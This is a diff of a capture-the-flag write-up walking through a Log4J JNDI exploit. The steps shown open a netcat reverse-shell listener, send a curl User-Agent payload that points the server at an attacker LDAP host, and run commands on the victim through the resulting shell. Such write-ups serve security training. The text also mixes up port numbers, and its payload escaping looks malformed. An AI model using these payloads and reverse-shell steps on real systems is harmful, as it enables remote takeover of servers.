@@ -53,7 +53,7 @@ There are several approaches to solving this CTF. Here is one successful approac
 
 4.    In c2_instance, run ‘nc -nlvp 9999’. The instructions stated that the compiled java code would want to talk on port 9999. We need to open a listener on that port to receive the java code, which is a reverse shell. 
 
-5.    In curl_instance, we will send the exploit payload. Run curl -A '\{jndi:ldap://ldap_server:1389/Exploit}' http://<web_server_IP>:8080, where <web_server_IP> is the IP address recovered from step 3 above. [1] When this payload is received by web_server, instead of Log4J logging the header it will make a connection to ldap_server on port 8080, asking for the Exploit reference object. [2] ldap_sever then queries the reference object which links out to http_server hosting the java code. [3] The reverse shell is sent to web_server and opened on c2_instance. 
+5.    In curl_instance, we will send the exploit payload. Run curl -A "'\'{jndi:ldap://ldap_server:1389/Exploit}" http://<web_server_IP>:8080, where <web_server_IP> is the IP address recovered from step 3 above. [1] When this payload is received by web_server, instead of Log4J logging the header it will make a connection to ldap_server on port 8080, asking for the Exploit reference object. [2] ldap_sever then queries the reference object which links out to http_server hosting the java code. [3] The reverse shell is sent to web_server and opened on c2_instance. 
 
 6.    Run ‘find / -name flag.txt’ in c2_instance, which is now a reverse shell executing these commands on web_server. 
 
